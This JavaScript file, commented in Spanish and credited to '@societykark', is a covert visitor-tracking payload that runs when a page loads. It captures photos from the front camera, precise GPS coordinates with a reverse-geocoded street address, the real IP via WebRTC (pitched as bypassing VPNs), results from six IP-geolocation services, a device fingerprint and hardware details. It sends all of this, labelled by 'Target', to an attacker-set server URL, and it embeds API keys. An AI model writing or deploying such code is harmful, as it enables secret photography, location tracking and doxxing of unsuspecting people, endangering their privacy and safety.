(function() {
    const scriptTag = document.currentScript;
    const trackingId = scriptTag.dataset.trackingId;
    const workerUrl = scriptTag.dataset.serverUrl;

    // ============================================================
    // 1. GEOCÓDIGO INVERSO CON OPENSTREETMAP NOMINATIM
    // ============================================================
    async function reverseGeocode(lat, lng) {
        try {
            const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=18&addressdetails=1`;
            const res = await fetch(url, { headers: { 'User-Agent': 'TrackerBot/1.0' } });
            const data = await res.json();
            if (data && data.display_name) {
                return data.display_name;
            }
            return null;
        } catch(e) {
            return null;
        }
    }

    // ============================================================
    // 2. WEBRTC - DETECTA IP REAL (INCLUSO DETRÁS DE VPN)
    // ============================================================
    function obtenerIPWebRTC() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate) return;
                const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                if (ip) {
                    pc.close();
                    resolve(ip[0]);
                }
            };
            setTimeout(() => {
                pc.close();
                resolve(null);
            }, 3000);
        });
    }

    // ============================================================
    // 3. CAPTURAR GPS CON WATCHPOSITION (MÁXIMA PRECISIÓN)
    // ============================================================
    function capturarGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            let mejor = null;
            let watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const coords = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude || null,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null
                    };
                    if (!mejor || coords.acc < mejor.acc) mejor = coords;
                    if (coords.acc < 20) {
                        navigator.geolocation.clearWatch(watchId);
                        resolve(mejor);
                    }
                },
                () => {
                    navigator.geolocation.clearWatch(watchId);
                    resolve(mejor);
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
            setTimeout(() => {
                navigator.geolocation.clearWatch(watchId);
                resolve(mejor);
            }, 8000);
        });
    }

    // ============================================================
    // 4. CAPTURAR FOTOS MÚLTIPLES
    // ============================================================
    async function capturarFotos(cantidad = 3) {
        const fotos = [];
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.style.display = 'none';
        canvas.style.display = 'none';
        document.body.appendChild(video);
        document.body.appendChild(canvas);

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
            });
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
            await new Promise(r => setTimeout(r, 300));

            for (let i = 0; i < cantidad; i++) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                fotos.push(blob);
                await new Promise(r => setTimeout(r, 200));
            }

            stream.getTracks().forEach(t => t.stop());
            video.remove();
            canvas.remove();
            return fotos;
        } catch(e) {
            return [];
        }
    }

    // ============================================================
    // 5. OBTENER UBICACIÓN COMPLETA (GPS + 6 APIs + WebRTC)
    // ============================================================
    const API_KEYS = {
        ipgeolocation: 'eb29afb1d16f49c796cfb25b58337e7f',
        ip2location: '2BC35858A6896EBB76CC56C0F5D015FA'
    };

    async function obtenerUbicacionCompleta() {
        const resultados = {
            gps: null,
            ipData: [],
            ipLocal: null
        };

        resultados.gps = await capturarGPS();

        const apis = [
            { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
            { name: 'ipwho.is', url: 'https://ipwho.is/' },
            { name: 'ip-api.com', url: 'http://ip-api.com/json/' },
            { name: 'ipinfo.io', url: 'https://ipinfo.io/json?token=cc8b16d96bd8ad' },
            { name: 'ipgeolocation.io', url: `https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEYS.ipgeolocation}` },
            { name: 'ip2location.io', url: `https://api.ip2location.io/?key=${API_KEYS.ip2location}` }
        ];

        resultados.ipData = await Promise.all(
            apis.map(async (api) => {
                try {
                    const res = await fetch(api.url);
                    const data = await res.json();
                    return { fuente: api.name, data };
                } catch(e) {
                    return { fuente: api.name, data: null, error: e.message };
                }
            })
        );

        resultados.ipLocal = await obtenerIPWebRTC();

        return resultados;
    }

    // ============================================================
    // 6. DATOS DEL DISPOSITIVO
    // ============================================================
    function obtenerDispositivo() {
        const ua = navigator.userAgent;
        let modelo = 'Desconocido';
        if (ua.includes('iPhone')) modelo = 'iPhone';
        else if (ua.includes('iPad')) modelo = 'iPad';
        else if (ua.includes('Android')) modelo = 'Android';
        else if (ua.includes('Mac')) modelo = 'Mac';
        else if (ua.includes('Windows')) modelo = 'Windows PC';
        else if (ua.includes('Linux')) modelo = 'Linux';

        return {
            modelo: modelo,
            userAgent: ua,
            language: navigator.language || 'N/A',
            platform: navigator.platform || 'N/A',
            vendor: navigator.vendor || 'N/A',
            resolution: `${window.screen.width}x${window.screen.height}`,
            colorDepth: window.screen.colorDepth || 'N/A',
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A'
        };
    }

    // ============================================================
    // 7. FINGERPRINT
    // ============================================================
    function obtenerFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('FP', 10, 30);
            const hash = canvas.toDataURL().slice(0, 80);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const info = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            return { gpu, canvas: hash };
        } catch(e) {
            return { gpu: 'N/A', canvas: 'N/A' };
        }
    }

    // ============================================================
    // 8. BATERÍA Y ALMACENAMIENTO
    // ============================================================
    async function obtenerBateria() {
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'Sí' : 'No'
            };
        } catch(e) {
            return { level: 'N/A', charging: 'N/A' };
        }
    }

    async function obtenerAlmacenamiento() {
        try {
            const est = await navigator.storage.estimate();
            return {
                total: (est.quota / (1024**3)).toFixed(2) + ' GB',
                used: (est.usage / (1024**3)).toFixed(2) + ' GB'
            };
        } catch(e) {
            return { total: 'N/A', used: 'N/A' };
        }
    }

    // ============================================================
    // 9. PERMISOS
    // ============================================================
    async function obtenerPermisos() {
        const permisos = { camera: 'Desconocido', location: 'Desconocido' };
        try {
            const resultCam = await navigator.permissions.query({ name: 'camera' });
            permisos.camera = resultCam.state;
        } catch(e) {}
        try {
            const resultLoc = await navigator.permissions.query({ name: 'geolocation' });
            permisos.location = resultLoc.state;
        } catch(e) {}
        return permisos;
    }

    // ============================================================
    // 10. ENVIAR TODOS LOS DATOS AL WORKER (COMO JSON)
    // ============================================================
    async function enviarAlWorker() {
        const [fotos, ubicacion, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
            capturarFotos(3),
            obtenerUbicacionCompleta(),
            obtenerDispositivo(),
            obtenerFingerprint(),
            obtenerBateria(),
            obtenerAlmacenamiento(),
            obtenerPermisos()
        ]);

        let msg = '📊 *VISITOR INFORMATION CAPTURED*\n━━━━━━━━━━━━━━━━\n';

        // 1. Dispositivo
        msg += `🖥️ *Device & Browser*\n`;
        msg += `   • Device Model: ${dispositivo.modelo}\n`;
        msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;

        // 2. IP Local (WebRTC)
        if (ubicacion.ipLocal) {
            msg += `🔒 *Local IP (WebRTC)*\n   • ${ubicacion.ipLocal}\n\n`;
        }

        // 3. Red
        msg += `🌐 *Network Information*\n`;
        ubicacion.ipData.forEach(api => {
            if (api.data && !api.error) {
                const d = api.data;
                let ip = d.ip || d.query || 'N/A';
                let ciudad = d.city || 'N/A';
                let region = d.region || d.regionName || 'N/A';
                let pais = d.country || d.country_name || 'N/A';
                msg += `   • ${api.fuente}: ${ip} | ${ciudad}, ${region}, ${pais}\n`;
            }
        });

        // 4. Ubicación (GPS + Geocódigo)
        if (ubicacion.gps) {
            const g = ubicacion.gps;
            const direccion = await reverseGeocode(g.lat, g.lng);
            msg += `\n📍 *GPS Location* (precisión ±${g.acc}m)\n`;
            msg += `   • Lat: ${g.lat}\n`;
            msg += `   • Lng: ${g.lng}\n`;
            if (g.alt) msg += `   • Altitud: ${g.alt} m\n`;
            if (g.heading) msg += `   • Dirección: ${g.heading}°\n`;
            if (g.speed) msg += `   • Velocidad: ${g.speed} m/s\n`;
            if (direccion) msg += `   • 📌 Dirección exacta: ${direccion}\n`;
            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${g.lat},${g.lng}\n\n`;
        } else {
            const apiConDatos = ubicacion.ipData.find(api => api.data && api.data.lat && api.data.lon);
            if (apiConDatos) {
                const d = apiConDatos.data;
                msg += `\n📍 *IP Location (${apiConDatos.fuente})*\n`;
                msg += `   • Country: ${d.country || d.country_name || 'N/A'}\n`;
                msg += `   • Region: ${d.region || d.regionName || 'N/A'}\n`;
                msg += `   • City: ${d.city || 'N/A'}\n`;
                msg += `   • Postal Code: ${d.zip || d.postal || 'N/A'}\n`;
                msg += `   • Timezone: ${d.timezone || 'N/A'}\n`;
                if (d.isp) msg += `   • ISP: ${d.isp}\n`;
                if (d.org) msg += `   • Organization: ${d.org}\n`;
                msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${d.lat},${d.lon}\n\n`;
            } else {
                msg += `\n📍 *Location Details*\n   • No disponible\n\n`;
            }
        }

        // 5. Display
        msg += `🖼️ *Display Information*\n`;
        msg += `   • Resolution: ${dispositivo.resolution}\n`;
        msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;

        // 6. Batería
        msg += `🔋 *Battery Status*\n`;
        msg += `   • Level: ${bateria.level}\n`;
        msg += `   • Charging: ${bateria.charging}\n\n`;

        // 7. Permisos
        msg += `🔐 *Device Permissions*\n`;
        msg += `   • Camera: ${permisos.camera}\n`;
        msg += `   • Location: ${permisos.location}\n\n`;

        // 8. Hardware
        msg += `💾 *Hardware & Storage*\n`;
        msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
        msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
        msg += `   • Storage Used: ${almacenamiento.used}\n`;
        msg += `   • Storage Total: ${almacenamiento.total}\n\n`;

        // 9. Fingerprint
        msg += `🎨 *Fingerprint*\n`;
        msg += `   • GPU: ${fp.gpu}\n\n`;

        // 10. Target
        msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
        msg += `⚡ Developed by: @societykark\n\n`;
        msg += `⏰ ${new Date().toISOString()}`;

        // ========== ENVIAR COMO JSON ==========
        try {
            const response = await fetch(workerUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text: msg })
            });
            const result = await response.json();
            console.log('✅ Enviado:', result);
        } catch(e) {
            console.error('❌ Error:', e);
        }
    }

    // ============================================================
    // 11. EJECUTAR AL CARGAR LA PÁGINA
    // ============================================================
    window.addEventListener('load', () => {
        setTimeout(enviarAlWorker, 1000);
    });
})();
